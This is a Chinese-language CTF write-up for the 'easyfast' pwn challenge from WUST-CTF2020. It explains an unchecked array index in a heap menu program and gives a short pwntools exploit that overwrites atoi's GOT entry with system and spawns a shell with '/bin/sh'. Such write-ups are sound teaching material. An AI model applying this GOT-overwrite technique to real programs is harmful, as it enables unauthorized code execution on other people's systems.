
## easyfast
- 题目描述：
    
    > Author: ColdShield
- 题目附件：[easyfast](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/easyfast/easyfast)
- 考察点：数组越界
- 难度：中等
- 初始分值：1000
- 最终分值：1000
- 完成人数：2

### 程序分析

貌似是个fastbin attack入门题，标准的菜单式堆题。

然鹅编辑功能没有检查`index`是否合法，因此还是可以数组越界写。

```c
unsigned __int64 edit(){
  __int64 inedx; // ST08_8
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index>");
  fgets(&s, 8, stdin);
  inedx = atoi(&s);
  read(0, buf[inedx], 8uLL);
  return __readfsqword(0x28u) ^ v3;
}
```

> `buf`位于bss段

### 解题思路

依然可以用修改got表的思路，比如改程序中常用的`atoi`函数：

```nasm
[0x602060] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e443d0 (setvbuf) ◂— push   r13
[0x602068] atoi@GLIBC_2.2.5 -> 0x7ffff7e052c0 (atoi) ◂— sub    rsp, 8
[0x602070] exit@GLIBC_2.2.5 -> 0x400786 (exit@plt+6) ◂— push   0xb /* 'h\x0b' */
```

`read(0, buf[inedx], 8)`是向`buf[index]`中的**指针指向的地址**处写8个字节，因此要构造：

`buf[inedx]=addr` & `addr->0x602068`

因此需要找一个指针，指向`atoi`的got表，显然那就是**reloc表**了

```nasm
pwndbg> search -8 0x602068
easyfast        0x400668 push   0x6020 /* 'h `' */
```

找到以后计算偏移量即可：`(0x400668-0x6020c0)/8=-262987`

> 直接用程序中的后门会因为执行system时栈基址偏移量不对导致getshell失败

所以覆盖`atoi`的got表为`system@plt`，然后给`atoi`传一个`"/bin/sh\0"`的参数即可getshell

### exp

```python
shell = elf.sym['system']
sla('choice>\n','3')
sea('index>\n','-262987')
se(p64(shell))
sl('/bin/sh\0')
```

